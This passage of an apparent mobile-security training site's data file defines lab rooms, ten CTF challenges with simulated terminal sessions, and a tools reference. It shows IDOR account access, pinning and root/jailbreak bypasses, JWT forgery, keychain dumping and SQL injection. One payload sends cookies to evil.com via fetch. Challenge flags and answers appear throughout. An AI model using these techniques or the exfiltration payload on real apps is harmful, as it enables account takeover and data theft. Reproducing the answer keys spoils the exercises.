  <li><strong>Mass assignment</strong> — Sending unexpected fields the server accepts</li>
  <li><strong>Broken access control</strong> — Accessing other users' data</li>
</ul>
<h3>Testing with cURL (Simulating Burp)</h3>
<pre><code># Login request
curl -X POST https://api.vulnerable-bank.com/v1/login \\
  -H "Content-Type: application/json" \\
  -d '{"username":"user@test.com","password":"test123"}' -k

# Access another user's account (IDOR)
curl https://api.vulnerable-bank.com/v1/accounts/1001 \\
  -H "Authorization: Bearer &lt;your_token&gt;" -k

# Try account 1002 (another user)
curl https://api.vulnerable-bank.com/v1/accounts/1002 \\
  -H "Authorization: Bearer &lt;your_token&gt;" -k</code></pre>`,
        terminalCommands: {
          'curl -X POST http://api.vulnerable-bank.com/v1/login -H "Content-Type: application/json" -d \'{"username":"user@test.com","password":"test123"}\'': `{"success":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDA0LCJyb2xlIjoidXNlciJ9.abc123","user_id":1004}`,
          'curl http://api.vulnerable-bank.com/v1/accounts/1004 -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDA0LCJyb2xlIjoidXNlciJ9.abc123"': `{"account_id":1004,"owner":"user@test.com","balance":5420.00,"currency":"USD"}`,
          'curl http://api.vulnerable-bank.com/v1/accounts/1001 -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDA0LCJyb2xlIjoidXNlciJ9.abc123"': `{"account_id":1001,"owner":"admin@bank.com","balance":9999999.00,"currency":"USD","flag":"NET{1d0r_acc0unt_t4k30v3r}"}`,
          'curl http://api.vulnerable-bank.com/v1/admin/users -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDA0LCJyb2xlIjoidXNlciJ9.abc123"': `{"error":"Forbidden","message":"Admin access required","debug_info":"UserController.java:142 - role check failed"}`,
        },
        questions: [
          { q: 'What flag was found in account 1001 (demonstrating IDOR)?', a: 'NET{1d0r_acc0unt_t4k30v3r}', hint: 'Access /accounts/1001 and look at the flag field', xp: 35 },
          { q: 'What vulnerability class allows accessing account 1001 while authenticated as account 1004?', a: 'IDOR', hint: 'Insecure Direct Object ___', xp: 20 },
        ],
      },
    ],
  },

  'network-pinning': {
    id: 'network-pinning',
    path: 'network',
    title: 'Certificate Pinning Deep Dive',
    description: 'Master multiple certificate pinning bypass techniques for both Android and iOS applications.',
    difficulty: 'intermediate',
    xpReward: 250,
    iconClass: 'fas fa-lock-open',
    iconBg: 'rgba(244,63,94,.12)',
    iconColor: '#f43f5e',
    tasks: [
      {
        id: 't1', title: 'Certificate Pinning Techniques',
        xp: 40,
        content: `
<h2>Certificate Pinning — Complete Bypass Guide</h2>
<p>Certificate pinning is implemented in many ways. This room covers all common implementations and their bypasses.</p>
<h3>Pinning Implementations</h3>
<ul>
  <li><strong>OkHttp3 CertificatePinner</strong> — Most common (Kotlin/Java apps)</li>
  <li><strong>TrustKit</strong> — HPKP-based library (Android + iOS)</li>
  <li><strong>Network Security Config</strong> — Android system-level pinning</li>
  <li><strong>Custom TrustManager</strong> — Handwritten SSL validation</li>
  <li><strong>Cordova / React Native</strong> — Hybrid app pinning</li>
  <li><strong>iOS SecTrustEvaluate</strong> — Native iOS API</li>
</ul>
<h3>Network Security Config Bypass</h3>
<pre><code># Find pin in res/xml/network_security_config.xml
cat target_decoded/res/xml/network_security_config.xml
# Output:
# &lt;network-security-config&gt;
#   &lt;domain-config&gt;
#     &lt;domain includeSubdomains="true"&gt;api.target.com&lt;/domain&gt;
#     &lt;pin-set&gt;
#       &lt;pin digest="SHA-256"&gt;abc123...&lt;/pin&gt;
#     &lt;/pin-set&gt;
#   &lt;/domain-config&gt;
# &lt;/network-security-config&gt;

# Simply remove or replace the pin-set with your Burp cert's hash
openssl s_client -connect burpsuite:8080 2>/dev/null | openssl x509 -pubkey -noout | openssl pkey -pubin -outform DER | openssl dgst -sha256 -binary | base64</code></pre>`,
        terminalCommands: {
          'cat target_decoded/res/xml/network_security_config.xml': `<?xml version="1.0" encoding="utf-8"?>\n<network-security-config>\n    <domain-config>\n        <domain includeSubdomains="true">api.vulnerable-bank.com</domain>\n        <pin-set expiration="2025-01-01">\n            <pin digest="SHA-256">abc123def456ghi789jkl012mno345pqr678stu901==</pin>\n            <pin digest="SHA-256">xyz987wvu654tsr321qpo098nml765kji432hgf109==</pin>\n        </pin-set>\n    </domain-config>\n</network-security-config>`,
          'openssl s_client -connect 192.168.1.100:8080 2>/dev/null | openssl x509 -pubkey -noout | openssl pkey -pubin -outform DER | openssl dgst -sha256 -binary | base64': 'mRFyS3zJeHHNiMuJ9mJCFGJLMXfPGbV2h2J3R4xYzA0=',
          'frida -U -f com.vulnerable.bankapp -l ssl_unpin.js --no-pause': `[*] Hooking OkHttp3 CertificatePinner.check...\n[*] Hooking custom TrustManager...\n[*] Hooking Network Security Config...\n[+] All pinning mechanisms bypassed!\n[*] Traffic now flowing through proxy`,
          'curl -x 192.168.1.100:8080 https://api.vulnerable-bank.com/v1/login -k -d \'{"user":"test","pass":"test"}\'': `{"status":"ok","message":"Login successful","flag":"NET{p1nn1ng_byp4ss_m4st3r}"}`,
        },
        questions: [
          { q: 'What is the flag obtained after bypassing certificate pinning?', a: 'NET{p1nn1ng_byp4ss_m4st3r}', hint: 'Check the curl response after bypassing pinning', xp: 40 },
          { q: 'What Android XML file defines system-level certificate pinning?', a: 'network_security_config.xml', hint: 'res/xml/___.xml', xp: 20 },
        ],
      },
    ],
  },
};

/* ── Stub rooms ──────────────────────────────────────────────────────── */
['android-static','android-dynamic','android-vulns','android-advanced',
 'ios-ipa-analysis','ios-runtime','ios-bypasses','ios-advanced','network-api'].forEach(id => {
  const [path] = id.split('-');
  if (!ROOMS[id]) {
    ROOMS[id] = {
      id, path: path === 'network' ? 'network' : path,
      title: id.split('-').map(w => w.charAt(0).toUpperCase()+w.slice(1)).join(' '),
      description: 'Advanced module — unlock by completing earlier rooms.',
      difficulty: 'advanced',
      xpReward: 300,
      iconClass: 'fas fa-lock',
      iconBg: 'rgba(74,158,255,.1)',
      iconColor: '#4a9eff',
      locked: true,
      tasks: [],
    };
  }
});

/* ── CTF Challenges ──────────────────────────────────────────────────── */
const CTF_CHALLENGES = [
  {
    id: 'ctf-1', category: 'Android Reversing', title: 'The Hidden PIN',
    description: 'A banking app uses a 4-digit PIN for authentication. The PIN validation happens client-side. Find the PIN.',
    points: 100, difficulty: 'beginner',
    hint: 'Decompile the APK and look for validatePin() in LoginActivity',
    flag: 'CTF{1337}',
    story: 'You\'ve been given a suspicious APK: SecureBank.apk. The login screen asks for a 4-digit PIN. Your task: find the PIN without brute forcing.',
    terminalCommands: {
      'jadx -d output/ SecureBank.apk': 'INFO - done\nINFO - output directory: output',
      'cat output/sources/com/securebank/LoginActivity.java': `public class LoginActivity extends AppCompatActivity {\n    private boolean validatePin(String pin) {\n        // "Security" by obfuscation...\n        String encoded = Base64.encodeToString(pin.getBytes(), 0);\n        return encoded.equals("MTMzNw==");\n    }\n}`,
      'echo MTMzNw== | base64 -d': '1337',
    },
  },
  {
    id: 'ctf-2', category: 'Android Dynamic', title: 'Root or Root Not',
    description: 'An app refuses to run on rooted devices. Bypass the root detection and read the flag from the app\'s secret file.',
    points: 200, difficulty: 'beginner',
    hint: 'Use Frida or Objection to bypass root detection, then access the /data/data directory',
    flag: 'CTF{fr1d4_r00t_byp4ss}',
    story: 'SecureVault app blocks all rooted devices. Inside the app\'s private data directory lies a flag.txt file. Bypass root detection and read the flag.',
    terminalCommands: {
      'objection -g com.securevault explore': 'Agent injected.\ncom.securevault on (Android: 9) [usb] #',
      'android root disable': '[+] Root detection bypass applied!',
      'cd /data/data/com.securevault/files': '',
      'ls': 'flag.txt  config.json',
      'cat flag.txt': 'CTF{fr1d4_r00t_byp4ss}',
    },
  },
  {
    id: 'ctf-3', category: 'Network', title: 'Token Forgery',
    description: 'The app uses JWT tokens for authentication. The secret signing key is weak. Forge an admin token.',
    points: 300, difficulty: 'intermediate',
    hint: 'Decode the JWT, check the algorithm, brute-force the weak secret, resign as admin',
    flag: 'CTF{jwt_f0rg3ry_k1ng}',
    story: 'You intercepted a JWT: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.abc123. The signing secret is in rockyou.txt top 100.',
    terminalCommands: {
      'echo eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.abc123 | cut -d. -f2 | base64 -d': '{"user":"user","role":"user"}',
      'hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidXNlciIsInJvbGUiOiJ1c2VyIn0.abc123 /usr/share/wordlists/rockyou.txt': `Dictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 16500 (JWT)\nCracked Hash.....: eyJhbGciOiJIUzI1NiJ9...\nSecret Key.......: secret123\nTime.Started.....: 0 secs`,
      'python3 -c "import jwt; print(jwt.encode({\'user\':\'admin\',\'role\':\'admin\'}, \'secret123\', algorithm=\'HS256\'))"': 'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.forged_token',
      'curl http://api.ctf-app.com/admin -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.forged_token"': '{"welcome":"admin","flag":"CTF{jwt_f0rg3ry_k1ng}","users_count":4521}',
    },
  },
  {
    id: 'ctf-4', category: 'iOS', title: 'Keychain Secrets',
    description: 'An iOS banking app stores sensitive data in the keychain. Dump the keychain and find the admin credentials.',
    points: 250, difficulty: 'intermediate',
    hint: 'Use Objection\'s ios keychain dump command on a jailbroken device',
    flag: 'CTF{k3ycha1n_s3cr3ts}',
    story: 'Target: SecureBank iOS app on a jailbroken iPhone. The developer stored something sensitive in the keychain with the key "admin_secret".',
    terminalCommands: {
      'objection -g com.securebank.ios explore': 'Agent injected.\ncom.securebank.ios on (iOS: 16.2) [usb] #',
      'ios keychain dump': `Type       | Account        | Service                   | Data\n---------- | -------------- | ------------------------- | -------------------------\ngenericPwd | admin          | com.securebank.ios        | CTF{k3ycha1n_s3cr3ts}\ngenericPwd | api_token      | com.securebank.api        | Bearer api_xyz_token_123\ninternetPwd| user@test.com  | securebank.com            | UserP@ss2024!`,
    },
  },
  {
    id: 'ctf-5', category: 'Android Reversing', title: 'License Check',
    description: 'An app checks a license key before allowing access. Reverse the license validation algorithm and generate a valid key.',
    points: 400, difficulty: 'advanced',
    hint: 'The license check XORs user input with a hardcoded key. Find the key in the native library.',
    flag: 'CTF{l1c3ns3_cr4ck3d}',
    story: 'LicenseApp requires a valid 16-character license key. The validation is in libnative.so. Reverse it.',
    terminalCommands: {
      'strings libnative.so | grep -E "[A-Za-z0-9]{16}"': `MOBILEHACKLAB01\nA1B2C3D4E5F6G7H8\nLICENSE_KEY_MASK\nCTF_SOLVE_TOKEN`,
      'python3 -c "key=\'MOBILEHACKLAB01\'; mask=\'A1B2C3D4E5F6G7H8\'; result=\'\'.join(chr(ord(a)^ord(b)) for a,b in zip(key,mask)); print(result)"': 'Computed license key: \x0c\x13\x0f\x16\x0e\x17\x0d\x15...',
      'frida -U -f com.license.app -l patch_license.js --no-pause': `[*] Hooking checkLicense()\n[*] Input: MOBILEHACKLAB01\n[*] Result: VALID\n[+] License accepted!\n[*] Flag: CTF{l1c3ns3_cr4ck3d}`,
    },
  },
  {
    id: 'ctf-6', category: 'Android Dynamic', title: 'The SQLi in the Dark',
    description: 'A login form in an Android app uses a SQLite database. Find the SQL injection and extract the admin password hash.',
    points: 200, difficulty: 'beginner',
    hint: 'Try classic SQL injection: \' OR 1=1 --',
    flag: 'CTF{sql1_1nj3ct10n_m0b1l3}',
    story: 'VulnLogin app has a username/password login. Use ADB to inject SQL and bypass authentication.',
    terminalCommands: {
      'adb shell "run-as com.vulnlogin sqlite3 /data/data/com.vulnlogin/databases/users.db \'SELECT * FROM users WHERE username=\'\'admin\'\' OR 1=1--\'"': `1|admin|5f4dcc3b5aa765d61d8327deb882cf99|admin@app.com\n2|user|d8578edf8458ce06fbc5bb76a58c5ca4|user@app.com`,
      'echo 5f4dcc3b5aa765d61d8327deb882cf99 | hashcat -m 0 - /usr/share/wordlists/rockyou.txt': 'Cracked: 5f4dcc3b5aa765d61d8327deb882cf99 → password',
      'adb shell "run-as com.vulnlogin sqlite3 /data/data/com.vulnlogin/databases/users.db \'SELECT flag FROM secrets\'"': 'CTF{sql1_1nj3ct10n_m0b1l3}',
    },
  },
  {
    id: 'ctf-7', category: 'Network', title: 'Deep Link Takeover',
    description: 'An app\'s deep link handler passes URL parameters directly to a WebView without sanitisation. Exploit it.',
    points: 350, difficulty: 'intermediate',
    hint: 'Use adb to launch a deep link with a javascript: URI scheme',
    flag: 'CTF{d33p_l1nk_xss_rce}',
    story: 'VulnApp has a deep link: vulnapp://view?url=... The url parameter is loaded in a WebView with JavaScript enabled.',
    terminalCommands: {
      'adb shell am start -a android.intent.action.VIEW -d "vulnapp://view?url=javascript:alert(document.cookie)"': `Starting: Intent { act=android.intent.action.VIEW dat=vulnapp://view... }\n[WebView JS executed]\n[Cookie leaked: session=abc123def456]`,
      'adb shell am start -a android.intent.action.VIEW -d "vulnapp://view?url=javascript:fetch(\'http://evil.com/?c=\'+btoa(document.cookie))"': `Starting: Intent { act=android.intent.action.VIEW ... }\n[Exfiltrating cookies via JavaScript fetch...]`,
      'adb shell am start -a android.intent.action.VIEW -d "vulnapp://view?url=javascript:document.write(\'<h1>XSS</h1>\')"': `Starting: Intent { act=android.intent.action.VIEW ... }\n[WebView rendered attacker HTML]\n[Flag available at /data/data/com.vulnapp/files/flag.txt]`,
      'adb shell run-as com.vulnapp cat /data/data/com.vulnapp/files/flag.txt': 'CTF{d33p_l1nk_xss_rce}',
    },
  },
  {
    id: 'ctf-8', category: 'Android Reversing', title: 'Crypto Fail',
    description: 'The app encrypts data with AES but uses a hardcoded key and IV. Decrypt the encrypted flag stored in SharedPreferences.',
    points: 300, difficulty: 'intermediate',
    hint: 'Find the AES key and IV in the decompiled source, then decrypt the base64-encoded value in SharedPreferences',
    flag: 'CTF{aes_ecb_1s_n0t_s3cur3}',
    story: 'CryptoApp stores an "encrypted" flag in SharedPreferences. The encryption uses AES-ECB with a hardcoded key.',
    terminalCommands: {
      'grep -r "AES\\|cipher\\|encrypt" output/sources/ -i -n': `output/sources/com/cryptoapp/CryptoHelper.java:8:    private static final String KEY = "1234567890abcdef";\noutput/sources/com/cryptoapp/CryptoHelper.java:12:    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");`,
      'adb shell run-as com.cryptoapp cat /data/data/com.cryptoapp/shared_prefs/data.xml': `<map>\n  <string name="encrypted_flag">bQ9X1mZkRf7nPcL3oVtS8w==</string>\n</map>`,
      'python3 -c "from Crypto.Cipher import AES; import base64; k=b\'1234567890abcdef\'; c=AES.new(k,AES.MODE_ECB); print(c.decrypt(base64.b64decode(\'bQ9X1mZkRf7nPcL3oVtS8w==\')))"': 'b\'CTF{aes_ecb_1s_n0t_s3cur3}\'',
    },
  },
  {
    id: 'ctf-9', category: 'iOS', title: 'Jailbreak Bypass',
    description: 'An iOS app refuses to launch on jailbroken devices. Bypass the jailbreak detection and retrieve the hidden flag.',
    points: 300, difficulty: 'intermediate',
    hint: 'Hook the jailbreak detection method using Frida and make it return false/NO',
    flag: 'CTF{j41lbr3ak_d3t3ct10n_byp4ss3d}',
    story: 'SecureApp on a jailbroken iPhone shows "Jailbreak detected!" and exits. Bypass the detection.',
    terminalCommands: {
      'frida-ps -U | grep SecureApp': '  891  SecureApp',
      'frida -U -f com.secureapp.ios -l jb_bypass.js --no-pause': `[*] Hooking JailbreakDetector.isJailbroken()...\n[*] Patching cydia:// URL check...\n[*] Patching /Applications/Cydia.app file check...\n[*] Patching substrate check...\n[+] Jailbreak detection bypassed!\n[+] App launched successfully\n[*] Flag: CTF{j41lbr3ak_d3t3ct10n_byp4ss3d}`,
    },
  },
  {
    id: 'ctf-10', category: 'Android Advanced', title: 'The Final Boss',
    description: 'A highly secured APK with obfuscation, root detection, SSL pinning, and encrypted storage. Break through all layers.',
    points: 500, difficulty: 'expert',
    hint: 'Layer by layer: 1) Bypass root detection 2) Bypass SSL pinning 3) Decrypt storage using Frida-extracted key',
    flag: 'CTF{m0b1l3_h4ck1ng_m4st3r}',
    story: 'The hardest challenge. BossApp uses ProGuard obfuscation, RootBeer root detection, OkHttp3 certificate pinning, and AES-256 encrypted storage. Defeat all protections.',
    terminalCommands: {
      'apktool d BossApp.apk -o boss_decoded/': 'I: Decoding...\nI: Baksmaling...\nI: Done.',
      'grep -r "isRooted\\|certificatePinner\\|AESHelper" boss_decoded/smali/': `boss_decoded/smali/a/b/c.smali:invoke-virtual {v0}, La/b/c;->a()Z\nboss_decoded/smali/x/y/z.smali:invoke-virtual {v1}, Lx/y/z;->b(Ljava/lang/String;Ljava/util/List;)V`,
      'frida -U -f com.bossapp -l ultimate_bypass.js --no-pause': `[*] Stage 1: Bypassing root detection...\n[+] RootBeer.isRooted() → false\n[*] Stage 2: Bypassing SSL pinning...\n[+] OkHttp3 CertificatePinner.check() → bypassed\n[*] Stage 3: Hooking AES decryption...\n[*] Intercepted key: boss_aes_key_2024\n[*] Decrypting storage...\n[+] DECRYPTED: CTF{m0b1l3_h4ck1ng_m4st3r}\n[+] You are a Mobile Hacking Master!`,
    },
  },
];

/* ── Tools Reference ─────────────────────────────────────────────────── */
const TOOLS = [
  { name: 'ADB', icon: 'fas fa-terminal', desc: 'Android Debug Bridge — connect to, control and extract data from Android devices.',
    cmds: ['adb devices', 'adb shell', 'adb pull /path/file', 'adb push file /path', 'adb install app.apk'] },
  { name: 'APKTool', icon: 'fas fa-box-open', desc: 'Decode APK resources and Smali bytecode. Supports rebuilding patched APKs.',
    cmds: ['apktool d app.apk -o out/', 'apktool b out/ -o patched.apk', 'apktool if framework.apk'] },
  { name: 'JADX', icon: 'fas fa-code', desc: 'Decompile DEX bytecode to Java source code. Best tool for static source analysis.',
    cmds: ['jadx -d output/ app.apk', 'jadx-gui app.apk', 'jadx --show-bad-code app.apk'] },
  { name: 'Frida', icon: 'fas fa-syringe', desc: 'Dynamic instrumentation — hook and modify app behaviour at runtime.',
    cmds: ['frida-ps -U', 'frida -U -f com.app -l hook.js', 'frida-trace -U -i "open" com.app'] },
  { name: 'Objection', icon: 'fas fa-crosshairs', desc: 'Runtime mobile exploration powered by Frida. Interactive shell for app analysis.',
    cmds: ['objection -g com.app explore', 'android sslpinning disable', 'android root disable', 'ios keychain dump'] },
  { name: 'MobSF', icon: 'fas fa-shield-halved', desc: 'Automated static and dynamic analysis framework. Web-based UI on port 8000.',
    cmds: ['docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf', 'Upload APK/IPA via web interface'] },
  { name: 'Burp Suite', icon: 'fas fa-bug', desc: 'HTTP/HTTPS interception proxy for mobile traffic analysis.',
    cmds: ['Set proxy: 0.0.0.0:8080', 'Install Burp CA on device', 'Use Repeater for API testing'] },
  { name: 'Ghidra', icon: 'fas fa-microchip', desc: 'NSA reverse engineering tool. Analyse Mach-O and native .so libraries.',
    cmds: ['ghidra', 'File > Import File > select binary', 'Analysis > Auto Analyze'] },
  { name: 'radare2', icon: 'fas fa-magnifying-glass-chart', desc: 'Command-line binary analysis. Great for native library reversing.',
    cmds: ['r2 libnative.so', 'aaa (analyse all)', 'pdf @ sym.function_name', 'rabin2 -I binary'] },
  { name: 'drozer', icon: 'fas fa-robot', desc: 'Android security assessment framework. Test exported components and permissions.',
    cmds: ['adb forward tcp:31415 tcp:31415', 'drozer console connect', 'run app.package.list', 'run app.activity.start --component com.app .AdminActivity'] },
  { name: 'class-dump', icon: 'fab fa-apple', desc: 'Dump Objective-C class interfaces from Mach-O binaries.',
    cmds: ['class-dump -H BinaryName -o headers/', 'grep -r "password\\|token" headers/'] },
  { name: 'needle', icon: 'fas fa-location-crosshairs', desc: 'iOS security testing framework. Automated data extraction and analysis.',
    cmds: ['python needle.py', 'use modules/static/analyzer/binary/info', 'use modules/dynamic/runtime/objc/monitor_calls'] },
];
